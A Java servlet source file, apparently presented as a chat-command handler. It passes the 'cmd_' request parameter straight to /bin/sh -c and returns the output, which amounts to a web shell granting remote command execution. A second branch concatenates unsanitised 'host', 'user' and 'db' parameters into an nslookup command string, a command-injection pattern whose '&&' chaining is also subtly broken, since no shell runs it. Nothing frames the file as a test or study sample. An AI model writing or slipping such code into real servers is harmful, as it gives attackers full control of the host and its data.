import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class ChatCommandServlet extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String cmd = request.getParameter("cmd_");
        String user = request.getParameter("user");
        String db = request.getParameter("db");
        
        if(cmd != null) {
            try {
                String[] commands = {"/bin/sh", "-c", "echo \\"Processing cmd: " + cmd + "\\" && " + cmd};
                Process p = Runtime.getRuntime().exec(commands);
                BufferedReader in = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = in.readLine()) != null) {
                    response.getWriter().println(line);
                }
            } catch (Exception e) {
                response.sendError(500);
            }
            return;
        }
        
        String host = request.getParameter("host");
        if(host != null) {
            try {
                Process p = Runtime.getRuntime().exec(
                    "nslookup " + host + " && echo \\"User: " + user + " DB: " + db + "\\""
                );
                BufferedReader in = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = in.readLine()) != null) {
                    response.getWriter().println(line);
                }
            } catch (Exception e) {
                response.sendError(500);
            }
        }
    }
}